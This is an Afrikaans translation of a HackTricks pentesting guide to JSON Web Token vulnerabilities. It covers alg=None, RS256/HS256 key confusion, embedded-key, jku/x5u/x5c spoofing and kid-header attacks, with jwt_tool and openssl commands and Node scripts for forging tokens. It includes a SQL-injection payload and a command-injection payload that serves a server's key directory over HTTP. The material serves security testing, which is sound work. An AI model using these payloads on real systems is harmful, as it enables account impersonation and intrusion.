# JWT Kwesbaarhede (Json Web Tokens)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks), en begin om belonings te verdien tot **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Deel van hierdie pos is gebaseer op die wonderlike pos:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Outeur van die fantastiese instrument om JWT's te pentest** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Vinnige Wenke**

Voer [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) uit met die modus `All Tests!` en wag vir groen lyne
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
As jy gelukkig is, sal die instrument 'n geval vind waar die webtoepassing die JWT verkeerd kontroleer:

![](<../.gitbook/assets/image (435).png>)

Dan kan jy die versoek in jou proksi soek of die gebruikte JWT vir daardie versoek dump met behulp van die jwt\_ instrument:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Verander data sonder om iets te wysig

Jy kan net met die data speel sonder om die handtekening te verander en kyk of die bediener die handtekening nagaan. Probeer byvoorbeeld jou gebruikersnaam na "admin" verander.

#### **Word die token nagegaan?**

Om te kyk of 'n JWT se handtekening geverifieer word:

- 'n Foutboodskap dui aan dat daar voortdurende verifikasie plaasvind; sensitiewe besonderhede in oordadige foute moet nagegaan word.
- 'n Verandering in die teruggestuurde bladsy dui ook op verifikasie.
- Geen verandering dui op geen verifikasie nie; dit is wanneer jy kan eksperimenteer met die verandering van bewerings in die data.

### Oorsprong

Dit is belangrik om vas te stel of die token serverkant of kli√´ntkant gegenereer is deur die versoekgeskiedenis van die tussenliggende bediener te ondersoek.

- Tokens wat vir die eerste keer van die kli√´ntkant af gesien word, dui daarop dat die sleutel moontlik blootgestel word aan kli√´ntkant-kode, wat verdere ondersoek vereis.
- Tokens wat serverkant gegenereer word, dui op 'n veilige proses.

### Duur

Kyk of die token langer as 24 uur hou... miskien verval dit nooit nie. As daar 'n "exp" veld is, kyk of die bediener dit korrek hanteer.

### Brute-force HMAC-geheim

[**Sien hierdie bladsy.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Verander die algoritme na None (CVE-2015-9235)

Stel die gebruikte algoritme in as "None" en verwyder die handtekeninggedeelte.

Gebruik die Burp-uitbreiding genaamd "JSON Web Token" om hierdie kwesbaarheid te toets en verskillende waardes binne die JWT te verander (stuur die versoek na Repeater en in die "JSON Web Token" -kategorie kan jy die waardes van die token wysig. Jy kan ook kies om die waarde van die "Alg" veld na "None" te verander).

### Verander die algoritme RS256(asimmetries) na HS256(simmetries) (CVE-2016-5431/CVE-2016-10555)

Die algoritme HS256 gebruik die geheime sleutel om elke boodskap te onderteken en te verifieer.\
Die algoritme RS256 gebruik die privaat sleutel om die boodskap te onderteken en gebruik die openbare sleutel vir verifikasie.

As jy die algoritme van RS256 na HS256 verander, gebruik die agterkantse kode die openbare sleutel as die geheime sleutel en gebruik dan die HS256-algoritme om die handtekening te verifieer.

Daarna kan ons, deur die openbare sleutel te gebruik en RS256 na HS256 te verander, 'n geldige handtekening skep. Jy kan die sertifikaat van die webbediener ophaal deur die volgende uit te voer:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nuwe openbare sleutel binne die kop

'n Aanvaller voeg 'n nuwe sleutel by die kop van die token in en die bediener gebruik hierdie nuwe sleutel om die handtekening te verifieer (CVE-2018-0114).

Dit kan gedoen word met die "JSON Web Tokens" Burp-uitbreiding.\
(Stuur die versoek na die Herhaler, kies "CVE-2018-0114" in die JSON Web Token-tabblad en stuur die versoek).

### JWKS Spoofing

Die instruksies beskryf 'n metode om die veiligheid van JWT-tokens te assesseer, veral di√© wat 'n "jku" kopclaim gebruik. Hierdie claim moet skakel na 'n JWKS (JSON Web Key Set) l√™er wat die openbare sleutel bevat wat nodig is vir die verifikasie van die token.

- **Assessering van Tokens met "jku" Kop**:
- Verifieer die URL van die "jku" claim om te verseker dat dit na die toepaslike JWKS-l√™er lei.
- Verander die "jku" waarde van die token om na 'n beheerde webdiens te verwys, wat verkeerswaarneming moontlik maak.

- **Monitering vir HTTP-interaksie**:
- Die waarneming van HTTP-versoeke na jou gespesifiseerde URL dui daarop dat die bediener poog om sleutels van jou voorsiene skakel te haal.
- Wanneer jy `jwt_tool` vir hierdie proses gebruik, is dit belangrik om die `jwtconf.ini` l√™er met jou persoonlike JWKS-plek op te dateer om die toetsing te fasiliteer.

- **Opdrag vir `jwt_tool`**:
- Voer die volgende opdrag uit om die scenario met `jwt_tool` te simuleer:
```bash
python3 jwt_tool.py JWT_HIER -X s
```

### Kid Probleme Oorsig

'n Opsionele kopclaim genaamd `kid` word gebruik om 'n spesifieke sleutel te identifiseer, wat veral belangrik is in omgewings waar daar verskeie sleutels vir die verifikasie van tokenhandtekeninge bestaan. Hierdie claim help om die toepaslike sleutel te kies om 'n token se handtekening te verifieer.

#### Openbaarmaking van Sleutel deur "kid"

Wanneer die `kid` claim teenwoordig is in die kop, word dit aanbeveel om die webgids te deursoek vir die ooreenstemmende l√™er of sy variasies. Byvoorbeeld, as `"kid":"key/12345"` gespesifiseer word, moet die l√™ers _/key/12345_ en _/key/12345.pem_ in die webwortel gesoek word.

#### Padtraversering met "kid"

Die `kid` claim kan ook uitgebuit word om deur die l√™erstelsel te navigeer, wat moontlik die keuse van 'n willekeurige l√™er toelaat. Dit is moontlik om vir konnektiwiteit te toets of Server-Side Request Forgery (SSRF) aanvalle uit te voer deur die `kid` waarde te verander om spesifieke l√™ers of dienste te teiken. Die manipulasie van die JWT om die `kid` waarde te verander terwyl die oorspronklike handtekening behou word, kan gedoen word deur die `-T` vlag in jwt_tool te gebruik, soos hieronder gedemonstreer:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Deur te mikpunt te maak van l√™ers met voorspelbare inhoud, is dit moontlik om 'n geldige JWT te vervals. Byvoorbeeld, die `/proc/sys/kernel/randomize_va_space` l√™er in Linux-stelsels, wat bekend is dat dit die waarde **2** bevat, kan gebruik word in die `kid` parameter met **2** as die simmetriese wagwoord vir JWT-generering.

#### SQL-injeksie via "kid"

As die inhoud van die `kid` bewering gebruik word om 'n wagwoord uit 'n databasis te haal, kan 'n SQL-injeksie gefasiliteer word deur die `kid` payload te wysig. 'n Voorbeeld-payload wat SQL-injeksie gebruik om die JWT-ondertekeningsproses te verander, sluit in:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Hierdie wysiging dwing die gebruik van 'n bekende geheime sleutel, `ATTACKER`, vir JWT-ondertekening.

#### OS-injeksie deur middel van "kid"

'n Scenario waar die `kid` parameter 'n l√™erpad spesifiseer wat binne 'n opdraguitvoerkonteks gebruik word, kan lei tot Remote Code Execution (RCE) kwesbaarhede. Deur opdragte in die `kid` parameter in te spuit, is dit moontlik om private sleutels bloot te stel. 'n Voorbeeld-payload om RCE en sleutelblootstelling te bereik, is:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u en jku

#### jku

jku staan vir **JWK Set URL**.\
As die token 'n "**jku**" **Header** bewering gebruik, **kyk na die verskafte URL**. Dit moet na 'n URL verwys wat die JWKS-l√™er bevat wat die Openbare Sleutel bevat om die token te verifieer. Wysig die token om die jku-waarde na 'n webdiens te wys wat jy verkeer vir kan monitor.

Eerstens moet jy 'n nuwe sertifikaat skep met nuwe private & openbare sleutels.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Dan kan jy byvoorbeeld [**jwt.io**](https://jwt.io) gebruik om die nuwe JWT te skep met die **geskepte openbare en private sleutels en deur die jku-parameter na die geskepte sertifikaat te verwys.** Om 'n geldige jku-sertifikaat te skep, kan jy die oorspronklike een aflaai en die nodige parameters verander.

Jy kan die parameters "e" en "n" verkry uit 'n openbare sertifikaat deur gebruik te maak van:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509-URL. 'n URI wat na 'n stel X.509 ( 'n sertifikaat formaat standaard) openbare sertifikate wat in PEM-vorm gekodeer is, verwys. Die eerste sertifikaat in die stel moet die een wees wat gebruik is om hierdie JWT te onderteken. Die volgende sertifikate onderteken elk die vorige een, en voltooi dus die sertifikaatketting. X.509 word gedefinieer in RFC 52807. Vervoersekuriteit is nodig om die sertifikate oor te dra.

Probeer om **hierdie kop te verander na 'n URL onder jou beheer** en kyk of enige versoek ontvang word. In daardie geval **kan jy die JWT manipuleer**.

Om 'n nuwe token te vervals met behulp van 'n sertifikaat wat deur jou beheer word, moet jy die sertifikaat skep en die openbare en private sleutels onttrek:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Dan kan jy byvoorbeeld [**jwt.io**](https://jwt.io) gebruik om die nuwe JWT te skep met die **geskepte openbare en private sleutels en deur die parameter x5u te verwys na die geskepte .crt-sertifikaat.**

![](<../.gitbook/assets/image (439).png>)

Jy kan ook beide hierdie kwesbaarhede **misbruik vir SSRFs**.

#### x5c

Hierdie parameter kan die **sertifikaat in base64** bevat:

![](<../.gitbook/assets/image (440).png>)

As die aanvaller 'n selfondertekende sertifikaat genereer en 'n vervalsde token skep met die ooreenstemmende private sleutel en die waarde van die "x5c" parameter vervang met die nuut gegenereerde sertifikaat en die ander parameters wysig, naamlik n, e en x5t, sal die vervalsde token in wese deur die bediener aanvaar word.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Ingeslote Openbare Sleutel (CVE-2018-0114)

As die JWT 'n ingeslote openbare sleutel het soos in die volgende scenario:

![](<../.gitbook/assets/image (438).png>)

Met behulp van die volgende nodejs-skrips is dit moontlik om 'n openbare sleutel uit daardie data te genereer:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Dit is moontlik om 'n nuwe privaat/publieke sleutel te genereer, die nuwe publieke sleutel binne die token in te sluit en dit te gebruik om 'n nuwe handtekening te genereer:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Jy kan die "n" en "e" verkry deur hierdie Node.js-skripsie te gebruik:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Uiteindelik kan jy met behulp van die openbare en private sleutel en die nuwe "n" en "e" waardes [jwt.io](https://jwt.io) gebruik om 'n nuwe geldige JWT met enige inligting te vervals.

### JTI (JWT ID)

Die JTI (JWT ID) eis verskaf 'n unieke identifiseerder vir 'n JWT-token. Dit kan gebruik word om te voorkom dat die token herhaal word.\
Stel jou voor 'n situasie waar die maksimum lengte van die ID 4 is (0001-9999). Die versoek 0001 en 10001 gaan dieselfde ID gebruik. As die agterkant die ID verhoog met elke versoek, kan jy dit misbruik om 'n versoek te **herhaal** (jy moet 10000 versoek stuur tussen elke suksesvolle herhaling).

### JWT Geregistreerde eise

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Ander aanvalle

**Kruisdiens Relais Aanvalle**

Dit is waargeneem dat sommige webtoepassings staatmaak op 'n vertroude JWT-diens vir die generering en bestuur van hul tokens. Daar is gevalle aangeteken waar 'n token wat vir een kli√´nt deur die JWT-diens gegenereer is, deur 'n ander kli√´nt van dieselfde JWT-diens aanvaar is. As die uitreiking of hernuwing van 'n JWT via 'n derdepartydiens waargeneem word, moet die moontlikheid ondersoek word om op 'n ander kli√´nt van daardie diens aan te meld met dieselfde gebruikersnaam/e-posadres. Daar moet dan 'n poging aangewend word om die verkryde token in 'n versoek na die teiken te herhaal om te sien of dit aanvaar word.

- Die aanvaarding van jou token kan dui op 'n kritieke probleem wat die vervalsing van enige gebruikersrekening moontlik maak. Dit moet egter opgemerk word dat toestemming vir wyer toetsing nodig mag wees as om aan te meld by 'n derdepartytoepassing, aangesien dit 'n regsgrys gebied kan betree.

**Vervaltyd Kontrole van Tokens**

Die vervaltyd van die token word gekontroleer deur die "exp" Payload-eis. Aangesien JWT's dikwels sonder sessie-inligting gebruik word, is versigtige hantering nodig. In baie gevalle kan die vaslegging en herhaling van 'n ander gebruiker se JWT die persoonifikasie van daardie gebruiker moontlik maak. Die JWT RFC beveel aan dat JWT-herhaalaanvalle beperk word deur die "exp" eis te gebruik om 'n vervaltyd vir die token in te stel. Verder is dit belangrik dat die toepassing relevante kontroles implementeer om te verseker dat hierdie waarde verwerk word en verstrykte tokens afgekeur word. As die token 'n "exp" eis insluit en toetsingstydlimiete dit toelaat, word dit aanbeveel om die token te stoor en dit na die verstrykingstyd te herhaal. Die inhoud van die token, insluitend tydstempelontleding en vervaltyd-kontrole (tydstempel in UTC), kan gelees word deur die -R-vlag van jwt_tool te gebruik.

- 'n Sekuriteitsrisiko kan aanwesig wees as die toepassing steeds die token valideer, aangesien dit kan impliseer dat die token nooit kan verval nie.


### Gereedskap

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty-platform wat deur hackers vir hackers geskep is**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) en begin om belonings tot **$100,000** te verdien!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks in PDF aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
